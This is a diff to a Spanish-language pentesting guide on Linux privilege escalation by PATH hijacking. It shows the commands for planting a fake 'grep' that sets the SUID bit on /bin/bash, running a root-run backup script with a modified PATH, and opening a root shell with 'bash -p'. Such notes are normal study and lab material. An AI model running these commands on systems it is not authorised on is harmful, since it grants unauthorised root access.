@@ -27,12 +27,17 @@ De esta manera, si tenemos un binario en **/home/kali** llamado **ifconfig** cuy
 #### CASO 2
 Tenemos un binario/script (a priori inútil) pero que se puede ejecutar como root, por ejemplo **backup.sh**, y este backup contiene algún comando, por ejemplo **grep**. Aunque el binario no sea editable, podemos aprovechar este script para alterar el path.
 
-1º Nos dirigimos a **/tmp** o a algún directorio editable y creamos un binario, por ejemplo **grep** con el siguiente contenido:
+1º Nos dirigimos a **/tmp** o a algún directorio editable y creamos un binario de un comando que esté contenido en el script, por ejemplo **grep** con el siguiente contenido:
 ```bash
 chmod u+s /bin/bash
 ```
 
-2º En el terminal:
+2º En el terminal (aprovechamos los privilegios para lanzar el backup.sh para alterar el path):
 ```bash
 sudo PATH=.:$PATH /ruta/al/backup.sh
+```
+
+3º 
+```bash
+bash -p
 ```
